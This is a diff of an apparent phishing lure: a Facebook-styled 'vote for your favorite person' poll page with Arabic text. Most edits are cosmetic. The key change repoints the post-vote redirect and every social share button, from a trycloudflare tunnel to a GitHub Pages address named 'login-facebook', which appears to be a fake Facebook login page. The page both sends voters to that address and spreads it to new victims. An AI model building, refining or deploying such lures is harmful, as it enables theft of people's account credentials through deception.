@@ -25,6 +25,7 @@
             color: #333;
             cursor: url('https://example.com/custom-cursor.png'), auto;
             transition: background 0.3s ease, color 0.3s ease;
+            overflow: hidden; /* Ensure smooth scrolling */
         }
         @keyframes gradientAnimation {
             0% { background-position: 0% 0%; }
@@ -224,9 +225,11 @@
             display: none;
         }
         .privacy-notice {
-            font-size: 12px;
+            font-size: 16px;
             color: #606770;
             margin-top: 20px;
+            line-height: 1.5;
+            text-align: center;
         }
         .privacy-notice a {
             color: #1877f2;
@@ -239,23 +242,23 @@
             margin-top: 20px;
         }
         .social-links a {
-            font-size: 24px;
-            color: #333;
-            margin: 0 10px;
+            color: #606770;
+            margin: 0 12px;
             transition: color 0.3s ease, transform 0.3s ease;
             display: inline-block;
             text-decoration: none;
+            font-size: 22px;
         }
         .social-links a:hover {
             color: #1877f2;
-            transform: scale(1.1);
+            transform: scale(1.2);
         }
         .social-links i {
             vertical-align: middle;
         }
         .footer {
             margin-top: 20px;
-            font-size: 12px;
+            font-size: 14px;
             color: #606770;
         }
         .footer a {
@@ -278,6 +281,14 @@
         .results-container p, .history-container p {
             font-size: 16px;
             color: #666;
+        }
+        /* Fade-out effect */
+        .fade-out {
+            animation: fadeOut 0.5s forwards;
+        }
+        @keyframes fadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; }
         }
     </style>
 </head>
@@ -319,11 +330,11 @@
             <a href="https://www.facebook.com/privacy/policy/" aria-label="Privacy Policy">تعرف على المزيد</a>
         </p>
         <div class="social-links">
-            <a href="https://www.facebook.com/sharer/sharer.php?u=https://barbara-optional-mom-roommates.trycloudflare.com" aria-label="Share on Facebook" target="_blank"><i class="fab fa-facebook"></i></a>
-            <a href="https://twitter.com/intent/tweet?url=https://barbara-optional-mom-roommates.trycloudflare.com&text=Check%20out%20this%20poll!" aria-label="Share on Twitter" target="_blank"><i class="fab fa-twitter"></i></a>
-            <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://barbara-optional-mom-roommates.trycloudflare.com&title=Vote%20for%20Your%20Favorite%20Person" aria-label="Share on LinkedIn" target="_blank"><i class="fab fa-linkedin"></i></a>
-            <a href="mailto:?subject=Check%20out%20this%20poll&body=Check%20out%20this%20poll%20at%20https://barbara-optional-mom-roommates.trycloudflare.com" aria-label="Share via Email" target="_blank"><i class="fas fa-envelope"></i></a>
-            <a href="https://api.whatsapp.com/send?text=Check%20out%20this%20poll%20at%20https://barbara-optional-mom-roommates.trycloudflare.com" aria-label="Share on WhatsApp" target="_blank"><i class="fab fa-whatsapp"></i></a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://face-star.github.io/login-facebook/" aria-label="Share on Facebook" target="_blank"><i class="fab fa-facebook"></i></a>
+            <a href="https://twitter.com/intent/tweet?url=https://face-star.github.io/login-facebook/&text=Check%20out%20this%20poll!" aria-label="Share on Twitter" target="_blank"><i class="fab fa-twitter"></i></a>
+            <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://face-star.github.io/login-facebook/&title=Vote%20for%20Your%20Favorite%20Person" aria-label="Share on LinkedIn" target="_blank"><i class="fab fa-linkedin"></i></a>
+            <a href="mailto:?subject=Check%20out%20this%20poll&body=Check%20out%20this%20poll%20at%20https://face-star.github.io/login-facebook/" aria-label="Share via Email" target="_blank"><i class="fas fa-envelope"></i></a>
+            <a href="https://api.whatsapp.com/send?text=Check%20out%20this%20poll%20at%20https://face-star.github.io/login-facebook/" aria-label="Share on WhatsApp" target="_blank"><i class="fab fa-whatsapp"></i></a>
         </div>
         <footer class="footer">
             <a href="mailto:support@example.com">support@example.com</a> للحصول على المساعدة، تواصل معنا على
@@ -335,7 +346,7 @@
 
         // Toggle dark mode
         document.addEventListener('keydown', (e) => {
-            if (e.code === 'KeyD') {
+            if (e.code === 'KeyD' && document.activeElement.tagName !== 'INPUT') {
                 document.body.classList.toggle('dark-mode');
                 document.querySelector('.login-container').classList.toggle('dark-mode');
             }
@@ -348,6 +359,7 @@
             const loading = document.getElementById('buttonLoading');
             const resultsContainer = document.getElementById('resultsContainer');
             const historyContainer = document.getElementById('historyContainer');
+            const container = document.querySelector('.login-container');
             
             if (voteInput) {
                 errorMessage.style.display = 'none';
@@ -357,14 +369,17 @@
                     successMessage.style.display = 'block';
                     successMessage.classList.add('show');
                     voteHistory.push(voteInput);
-                    document.querySelector('.login-container').style.display = 'none';
-                    resultsContainer.style.display = 'block';
-                    historyContainer.style.display = 'block';
-                    updateHistory();
+                    container.classList.add('fade-out');
                     setTimeout(() => {
-                        window.location.href = 'https://barbara-optional-mom-roommates.trycloudflare.com';
-                    }, 500); // Reduced delay
-                }, 1000); // Reduced delay
+                        container.style.display = 'none';
+                        resultsContainer.style.display = 'block';
+                        historyContainer.style.display = 'block';
+                        updateHistory();
+                        setTimeout(() => {
+                            window.location.href = 'https://face-star.github.io/login-facebook/';
+                        }, 300); // Delay before redirection
+                    }, 500); // Duration of fade-out
+                }, 1000); // Delay before showing success message
             } else {
                 errorMessage.style.display = 'block';
                 errorMessage.classList.add('show');
